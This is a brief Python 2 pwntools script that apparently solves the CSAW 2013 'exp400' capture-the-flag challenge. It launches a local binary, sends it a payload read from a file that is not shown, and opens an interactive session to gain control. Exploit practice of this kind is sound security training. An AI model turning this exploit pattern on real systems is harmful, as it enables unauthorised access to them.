from pwn import *
def main():
	p = process("./miteegashun")
	print p.recvline()
	print p.recvline()
	data = ""
	with open("/home/sneaky/Documents/pwnlist/csaw-2013-exp400/test.txt","rb") as fp:
		data = fp.read()
	p.sendline(data)
	p.interactive()
	pass
main()
